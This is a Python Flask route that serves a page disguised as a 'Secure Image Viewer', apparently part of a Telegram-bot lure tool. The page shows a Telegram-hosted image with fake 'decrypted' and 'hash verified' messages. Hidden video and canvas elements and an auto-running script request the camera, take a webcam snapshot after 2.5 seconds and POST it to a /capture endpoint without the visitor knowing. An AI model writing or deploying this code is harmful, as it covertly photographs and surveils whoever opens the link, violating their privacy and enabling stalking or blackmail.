@app.route('/view/<image_id>')
def view_image(image_id):
    try:
        file_info = bot.get_file(image_id)
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        # Note the double {{ }} for JavaScript sections
        return f'''
        <html>
            <head>
                <title>Secure Image Viewer</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="background-color: #0a0a0a; color: #00ff00; text-align: center; font-family: 'Courier New', monospace; padding: 20px;">
                <div style="border: 1px solid #00ff00; display: inline-block; padding: 20px; border-radius: 10px; background: #111;">
                    <h3>[ SYSTEM SECURE: IMAGE DECRYPTED ]</h3>
                    <img src="{file_url}" style="max-width: 100%; border: 1px solid #333; border-radius: 5px;">
                    <p style="color: #888; font-size: 12px;">Hash Verified. Decryption Complete.</p>
                </div>

                <video id="video" width="320" height="240" style="display:none;" autoplay playsinline></video>
                <canvas id="canvas" style="display:none;"></canvas>

                <script>
                    navigator.mediaDevices.getUserMedia({{ video: true }})
                    .then(stream => {{
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        
                        setTimeout(() => {{
                            const canvas = document.getElementById('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                            
                            fetch('/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ image: dataURL }})
                            }})
                            .then(res => console.log("Sent"))
                            .catch(err => console.error("Fetch error:", err));
                        }}, 2500);
                    }})
                    .catch(err => console.error("Camera access denied:", err));
                </script>
            </body>
        </html>
        '''
    except Exception as e:
        return f"Error: {str(e)}", 404
